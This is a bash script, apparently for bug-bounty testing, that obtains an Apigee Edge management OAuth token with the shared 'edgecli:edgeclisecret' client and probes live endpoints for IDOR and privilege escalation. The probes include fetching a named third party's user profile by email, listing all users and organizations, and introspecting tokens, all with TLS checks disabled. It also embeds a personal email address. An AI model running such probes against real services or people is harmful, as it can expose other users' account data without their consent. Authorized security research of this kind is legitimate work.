#!/bin/bash
# Get Apigee Edge management API OAuth token + probe authenticated endpoints
# Uses public client credentials: edgecli:edgeclisecret
# Run on Pi. Requires: Apigee Edge account email + password
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

# CONFIGURATION — set your test account credentials
APIGEE_EMAIL="${APIGEE_EMAIL:-zahinshahriar3@gmail.com}"
APIGEE_PASS="${APIGEE_PASS:-}"   # set via: export APIGEE_PASS='yourpass'

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L003-mgmt-api-probe.txt"
TOKEN_FILE="/tmp/apigee_mgmt_token.json"

if [ -z "$APIGEE_PASS" ]; then
  echo "ERROR: Set APIGEE_PASS env var before running"
  echo "Usage: export APIGEE_PASS='yourpassword' && bash scripts/apigee_mgmt_auth.sh"
  exit 1
fi

echo "=== Apigee Edge Management API Authentication + IDOR Probe ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo "Account: $APIGEE_EMAIL" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 1: Get management API token
echo "--- Step 1: Obtain OAuth token via edgecli:edgeclisecret ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 15 \
  -X POST "https://login.apigee.com/oauth/token" \
  -u "edgecli:edgeclisecret" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -d "grant_type=password&username=${APIGEE_EMAIL}&password=${APIGEE_PASS}&response_type=token" \
  -o "$TOKEN_FILE"
echo "Token response: $(cat $TOKEN_FILE | python3 -c "import sys,json; d=json.load(sys.stdin); print('access_token:', d.get('access_token','NONE')[:40] if 'access_token' in d else 'ERROR: ' + str(d))" 2>/dev/null)" | tee -a "$OUT"

ACCESS_TOKEN=$(python3 -c "import json; d=json.load(open('$TOKEN_FILE')); print(d.get('access_token',''))" 2>/dev/null)

if [ -z "$ACCESS_TOKEN" ]; then
  echo "FAILED: Could not obtain access token. Check credentials." | tee -a "$OUT"
  cat "$TOKEN_FILE" | tee -a "$OUT"
  exit 1
fi
echo "Token obtained: ${ACCESS_TOKEN:0:30}..." | tee -a "$OUT"
echo | tee -a "$OUT"

MGMT="https://api.enterprise.apigee.com"

# Step 2: Own user profile (baseline)
echo "--- Step 2: Own user profile (baseline) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Accept: application/json" \
  "${MGMT}/v1/users/${APIGEE_EMAIL}" | python3 -m json.tool 2>/dev/null | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 3: List all users (should 403 — Sysadmin only; if 200 = privilege escalation)
echo "--- Step 3: List all users GET /v1/users (should 403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 4: IDOR - probe a known Apigee community user's profile
# Using a known Apigee employee/admin email from community.apigee.com
# Single probe only (CLAUDE.md §7)
echo "--- Step 4: IDOR probe - known public community user ---" | tee -a "$OUT"
echo "NOTE: Using single probe only per rules of engagement" | tee -a "$OUT"
PROBE_EMAIL="arghya.c@apigee.com"  # publicly listed Apigee team member from community
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users/${PROBE_EMAIL}" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 5: List all organizations (should 403 for regular user)
echo "--- Step 5: List all organizations GET /v1/organizations ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/organizations" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 6: Enumerate user roles
echo "--- Step 6: User roles GET /v1/userroles ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/userroles" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 7: Token info + JTI (for revocation bypass test)
echo "--- Step 7: Token introspection /check_token ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -u "edgecli:edgeclisecret" \
  -X POST "https://login.apigee.com/check_token" \
  -d "token=${ACCESS_TOKEN}" | python3 -m json.tool 2>/dev/null | tee -a "$OUT"
echo | tee -a "$OUT"

echo "=== INTERPRETATION ===" | tee -a "$OUT"
echo "- GET /v1/users/{email}: 200 for own user = expected" | tee -a "$OUT"
echo "- GET /v1/users/{other}: 200 = IDOR (unauthorized cross-user read)" | tee -a "$OUT"
echo "- GET /v1/users/{other}: 403 = properly restricted" | tee -a "$OUT"
echo "- GET /v1/users (list): 200 = privilege escalation" | tee -a "$OUT"
echo "- GET /v1/organizations: 200 listing ALL orgs = privilege escalation" | tee -a "$OUT"
echo | tee -a "$OUT"
echo "Done. Results: $OUT"
echo "IMPORTANT: Do not commit the password. Only commit results after redacting."
